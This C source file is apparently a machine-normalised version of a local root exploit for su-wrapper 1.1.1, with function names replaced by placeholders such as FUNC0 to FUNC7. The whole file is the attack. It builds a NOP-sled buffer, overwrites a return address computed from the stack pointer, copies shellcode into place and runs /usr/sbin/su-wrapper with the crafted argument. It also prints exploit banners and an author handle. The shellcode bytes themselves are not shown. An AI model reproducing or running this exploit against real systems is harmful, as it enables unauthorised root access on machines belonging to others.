#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int ALIGN ; 
 int BUFFERSIZE ; 
 int OFFSET ; 
 int FUNC0 (char*) ; 
 scalar_t__ FUNC1 (char*,char*,char*,int /*<<< orphan*/ *) ; 
 int FUNC2 () ; 
 scalar_t__ FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int,int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 char* FUNC6 (int /*<<< orphan*/ ) ; 

int FUNC7(int argc, char **argv) {

 int i;

 unsigned long addr;

 char *buffer;

 int buffersize = BUFFERSIZE;
 int offset = OFFSET;
 int align = ALIGN;

 if(argc > 1) offset = FUNC0(argv[1]);

 if(argc > 2) align = FUNC0(argv[2]);

 if(argc > 3) buffersize = FUNC0(argv[3]);

 buffer = (char *)FUNC3(buffersize +8);

 addr = FUNC2() - offset;

 for(i = 0; i < buffersize; i+=4) {
  *(long *)&buffer[i] = 0x90909090;
 }

 *(long *)&buffer[buffersize - 4] = addr;

 *(long *)&buffer[buffersize - 8] = addr;

 FUNC4(buffer + buffersize - 8 - FUNC6(shellcode) - align, shellcode, FUNC6(shellcode));

 FUNC5("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
 
 FUNC5("[x] su-wrapper 1.1.1 local root exploit\n");
 FUNC5("[x] dex: - dexgod@softhome.net <> http://www.raza-mexicana.org - \n");

 FUNC5("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\n");

 FUNC5("[x] Address = 0x%x, Align = %d, Offset = %d\n", addr, align, offset);

 FUNC5("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\n");

 FUNC5("[x] Exploiting...\n");

 if ((FUNC1("/usr/sbin/su-wrapper", "su-wrapper", buffer, NULL)) != 0) {
  FUNC5("Could not start su-wrapper, /usr/sbin/su-wrapper exists?\n");
 }

}